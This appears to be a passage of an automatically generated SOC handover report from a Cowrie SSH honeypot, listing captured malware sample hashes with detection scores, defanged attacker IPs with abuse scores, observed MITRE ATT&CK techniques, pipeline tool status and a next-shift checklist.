| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `113.249.104[.]20` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 4 |
| `47.236.203[.]81` | SG | Alibaba Cloud LLC | **100** ⚠️ | 19 |
| `180.76.235[.]114` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 5 |
| `40.82.214[.]8` | AU | Microsoft Corporation | **100** ⚠️ | 50 |
| `120.48.22[.]219` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `37.143.61[.]84` | GB | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 29 |
| `123.48.142[.]249` | JP | Chubu Telecommunications Co.,Inc. | **100** ⚠️ | 50 |
| `120.48.80[.]70` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 46 |
| `120.48.181[.]192` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `36.93.249[.]106` | ID | PT Telekomunikasi Indonesia | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 21 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 95 cases |
| Tool 34  | Credential Extractor        | ✅ 54 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (2.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 1 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 14 recon entry/entries in table (4 group(s) consolidating 56 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-09T22:39:35Z_
